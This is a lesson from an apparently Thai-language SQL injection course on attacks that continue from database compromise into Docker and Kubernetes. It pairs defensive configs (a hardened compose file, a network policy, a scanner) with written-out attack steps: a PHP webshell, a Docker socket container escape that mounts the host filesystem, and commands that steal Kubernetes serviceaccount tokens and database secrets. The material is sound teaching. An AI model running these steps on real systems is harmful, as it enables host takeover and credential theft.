# Part 058: SQL Injection และ Container Security

## ภาพรวม

Docker และ Kubernetes environments สร้างความท้าทายใหม่ในการรักษาความปลอดภัยของ database

**ขั้นตอนที่ 941-955**

---

## 941. Docker Network และ DB Exposure

```bash
# ตรวจสอบว่า DB ถูก expose ออนสิดไหม

# docker-compose.yml ที่ VULNERABLE:
services:
  mysql:
    image: mysql:8
    ports:
      - "3306:3306"  # EXPOSED ออกนอก!
    environment:
      MYSQL_ROOT_PASSWORD: weak_password
      MYSQL_DATABASE: myapp

# SECURE:
services:
  mysql:
    image: mysql:8
    # ports: ไม่ expose ออกนอก
    environment:
      MYSQL_ROOT_PASSWORD_FILE: /run/secrets/mysql_password
    networks:
      - internal
    
  app:
    depends_on:
      - mysql
    networks:
      - internal
      - external  # เฉพาะ app ที่ expose

networks:
  internal:
    internal: true  # ไม่สามารถ access จาก host
  external:
```

---

## 942. Container Escape หลัง SQL Injection

```bash
# SQL injection -> OS exec -> container escape

# 1. SQLi -> webshell
echo '<?php system($_GET["c"]); ?>' > /var/www/html/s.php

# 2. ตรวจสอบว่าอยู่ใน container
cat /proc/1/cgroup | grep docker
ls /.dockerenv  # ปรากฟใน container

# 3. ตรวจสอบ Docker socket
ls -la /var/run/docker.sock  # ถ้ามี = หลุด!

# 4. Container escape ผ่าน Docker socket
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/v1.41/containers/json

# สร้าง container ใหม่ mount host filesystem:
curl -s --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/v1.41/containers/create?name=escape
```

---

## 943. Kubernetes Secret Exposure

```bash
# ถ้าได้ shell ใน pod ที่มี serviceaccount:
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# ใช้ kubectl จาก inside pod:
KUBECONFIG='' kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) \
  --server=https://kubernetes.default.svc \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  get secrets

# ดึง database credentials จาก secret:
kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d
```

---

## 944. Kubernetes Network Policy

```yaml
# กำหนดว่า DB รับ traffic เฉพาะจาก app pods
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: db-network-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: backend-api  # เฉพาะ backend pods
    ports:
    - protocol: TCP
      port: 3306
  egress: []  # ไม่อนุญาต egress (ป้องกัน OOB)
```

---

## 945. การสแกน Container Environment

```python
import requests
import json

class ContainerDBScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
    
    def check_db_exposure(self, host: str):
        """Check if common DB ports are exposed"""
        db_ports = {
            'MySQL': 3306,
            'PostgreSQL': 5432,
            'MSSQL': 1433,
            'MongoDB': 27017,
            'Redis': 6379,
            'Cassandra': 9042,
        }
        
        import socket
        exposed = {}
        for db, port in db_ports.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            if result == 0:
                exposed[db] = port
            sock.close()
        
        return exposed
    
    def detect_docker_socket(self) -> bool:
        """Check if Docker socket is exposed in container"""
        try:
            r = requests.get(
                'http://localhost/v1.41/version',
                timeout=2
            )
            return r.status_code == 200
        except Exception:
            pass
        
        import os
        return os.path.exists('/var/run/docker.sock')

# Usage
scanner = ContainerDBScanner('http://target')
# exposed = scanner.check_db_exposure('target.example.com')
# print(f"Exposed DBs: {exposed}")
```

---

## สรุป

Container Security + SQL Injection:
- **Docker expose** - อย่า expose DB port ออกนอก
- **Docker socket** - SQLi -> webshell -> escape
- **K8s secrets** - serviceaccount token สามารถดึง secrets
- **Network Policy** - จำกัด DB traffic เฉพาะจาก app pods
- **Egress** - block outbound จาก DB เพื่อป้องกัน OOB

---

*Part 058 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
